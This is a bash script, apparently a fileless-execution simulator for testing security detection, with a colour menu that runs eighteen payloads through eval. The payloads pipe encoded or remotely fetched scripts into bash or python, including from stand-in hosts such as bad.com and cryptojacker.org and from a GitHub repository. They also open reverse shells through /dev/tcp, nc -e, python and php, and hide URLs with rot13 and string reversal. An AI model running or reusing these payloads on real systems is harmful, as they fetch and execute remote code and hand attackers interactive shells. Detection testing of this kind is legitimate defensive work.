#!/usr/bin/env bash
#
# fileless-menu.sh  –  Upwind fileless-execution simulator
# ------------------------------------------------------------
# • Runs all payloads per category (1-4) or every payload (5)
# • Works even if colours are disabled (degrades gracefully)
# • Prompts for LHOST / LPORTs only once when a payload needs them
# ------------------------------------------------------------

set -eo pipefail         # real errors stop the script
shopt -s extglob         # needed for pattern matching tricks
export PS4=''            # no trace clutter if xtrace is enabled

# ── Colour definitions (use ESC-quoted strings) ──────────────
RESET=$'\e[0m'; BOLD=$'\e[1m'
BLU=$'\e[1;34m'; CYN=$'\e[1;36m'
GRN=$'\e[1;32m'; YEL=$'\e[1;33m'
RED=$'\e[1;31m'; MAG=$'\e[1;35m'

declare -A CAT_COL=(
  [Encoding]="$YEL"
  [Downloaders]="$GRN"
  [ReverseShells]="$RED"
  [AdvancedFD]="$MAG"
)

# ── Payload library (verbatim) ───────────────────────────────
declare -A categories

categories[Encoding]='
# 5
echo "ZXhlYyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK" | base64 -d | bash
# 6
bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)"
# 7
bash -c "$(echo ENFUGBYY | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"
# 8
exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
'

categories[Downloaders]='
# 1
curl -s http://example.com/script.sh | bash
# 2
exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
# 3
X=$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c "$X"
# 4
bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)"
'

categories[ReverseShells]='
# 9
timeout 2s bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1" &
#10
timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &
#11
timeout 2s python3 -c "import os,pty,socket,sys; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")" &
#12
timeout 2s php -r "\$s=fsockopen(\"${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");" &
#13
timeout 2s bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1" &
'

categories[AdvancedFD]='
#14
exec 3< <(echo "hs.doaolyp/moc.dab//:ptth" | rev | xargs curl -s); bash /proc/self/fd/3
#15
exec 3< /bin/bash; /proc/self/fd/3 -c "echo executed FD shell"
#16
exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&$FD; cat <&$FD &
#17
exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
#18
python3 - <<'PY'
import urllib.request, sys
print("[*] Inline Python payload executed (test.py)")
exec(urllib.request.urlopen("https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py").read().decode())
PY
'

# ── Defaults & interactive prompt for net vars ───────────────
LHOST=${LHOST:-127.0.0.1}
LPORT1=${LPORT1:-4441}
LPORT2=${LPORT2:-4442}
LPORT3=${LPORT3:-4443}

ask_net_vars() {
  echo -e "${BOLD}${CYN}→ Reverse-shell payload selected. Enter listener details (Enter = keep default).${RESET}"
  read -rp "  LHOST  [${LHOST}]: " tmp && [[ $tmp ]] && LHOST=$tmp
  read -rp "  LPORT1 [${LPORT1}]: " tmp && [[ $tmp ]] && LPORT1=$tmp
  read -rp "  LPORT2 [${LPORT2}]: " tmp && [[ $tmp ]] && LPORT2=$tmp
  read -rp "  LPORT3 [${LPORT3}]: " tmp && [[ $tmp ]] && LPORT3=$tmp
}

# ── Execution helpers ─────────────────────────────────────────
run_block() {     # arg1 = string containing several lines
  local block="$1"; set +u        # disable nounset just for eval
  while IFS= read -r line; do
    [[ $line =~ ^#\  ]] && continue          # skip comment markers
    [[ $line ]] || continue                  # skip blank lines
    echo -e "${YEL}[▶] $line${RESET}"
    eval "$line"
  done <<< "$block"
  set -u
}

execute_category() {               # arg1 = category name
  local cat="$1"
  [[ $cat == ReverseShells ]] && ask_net_vars
  run_block "${categories[$cat]}"
}

execute_all() {
  for cat in Encoding Downloaders ReverseShells AdvancedFD; do
    echo -e "\n${BOLD}${CAT_COL[$cat]}=== $cat ===${RESET}\n"
    execute_category "$cat"
  done
}

# ── Menu drawing ──────────────────────────────────────────────
draw_banner() {
  clear
  if command -v figlet >/dev/null 2>&1; then
    figlet -f slant Upwind 2>/dev/null | sed "s/^/${MAG}/;s/$/${RESET}/"
  else
    echo -e "${MAG}${BOLD}*** Upwind ***${RESET}"
  fi
  echo -e "${CYN}fileless execution simulation by Lior Boehm${RESET}\n"
}

draw_menu() {
  echo -e "${BOLD}== Choose an option ==${RESET}"
  printf "%s1%s) %bEncoding%b\n"        "$BLU" "$RESET"  "$YEL" "$RESET"
  printf "%s2%s) %bDownloaders%b\n"     "$BLU" "$RESET"  "$GRN" "$RESET"
  printf "%s3%s) %bReverseShells%b\n"   "$BLU" "$RESET"  "$RED" "$RESET"
  printf "%s4%s) %bAdvancedFD%b\n"      "$BLU" "$RESET"  "$MAG" "$RESET"
  printf "%s5%s) %bALL PAYLOADS%b\n"    "$BLU" "$RESET"  "$CYN" "$RESET"
  printf "%sq%s) %bQuit%b\n"            "$BLU" "$RESET"  "$BOLD" "$RESET"
}

# ── Main loop ────────────────────────────────────────────────
set +u   # ignore unset in UI logic
while true; do
  draw_banner
  draw_menu
  read -rp $'\nOption: ' opt || exit
  case $opt in
    1) execute_category Encoding;;
    2) execute_category Downloaders;;
    3) execute_category ReverseShells;;
    4) execute_category AdvancedFD;;
    5) execute_all;;
    [Qq]) exit 0;;
    *) echo "Invalid option"; sleep 1;;
  esac
  echo -e "\n${GRN}✓ Payload(s) finished. Press Enter to return to the main menu…${RESET}"
  read -r
done
